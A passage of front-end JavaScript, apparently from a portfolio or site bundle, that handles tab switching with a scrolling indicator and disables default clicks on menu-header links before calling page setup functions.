    function Tabs(data, dataContent, dataTitles, tabsClasses, dataScrollbarRanner) {
        const tabTitlesParrent = document.querySelector(`[data-tabs-${data}]`);
        const tabsContents = document.querySelectorAll(`${dataContent}`);
        const tabsTitles = document.querySelectorAll(`${dataTitles}`);
        const state = {
            index: "0"
        };
        tabTitlesParrent.addEventListener("click", (e => {
            const target = e.target;
            tabsTitles.forEach(((item, i) => {
                item.classList.remove("active");
                if (target == item) state.index = i;
            }));
            if (target.classList.contains(`${tabsClasses}`)) target.classList.add("active");
            tabsContents.forEach((item => {
                item.classList.remove("show");
            }));
            tabsContents[state.index].classList.add("show");
            const runner = document.querySelector(`[${dataScrollbarRanner}]`);
            const height = 63.5;
            const transition = state.index * height;
            runner.style.webkitTransform = `translateY(${transition}px)`;
        }));
    }
    Tabs("exp", ".exp__contents > [data-tabs-content]", "[data-tabs-exp] > [data-tabs-exp-title]", "exp", "data-scrollbar-runner");
    Tabs("exp-work", ".exp__contents > [data-tabs-content-work]", "[data-tabs-exp-work] > [data-tabs-exp-title-work]", "exp-work", "data-scrollbar-runner-work");
    const script_anchor = document.querySelectorAll(".menu-header__item > a");
    script_anchor.forEach((item => {
        item.addEventListener("click", (e => {
            e.preventDefault();
        }));
    }));
    window["FLS"] = true;
    menuInit();
    pageNavigation();
    assHole();
})();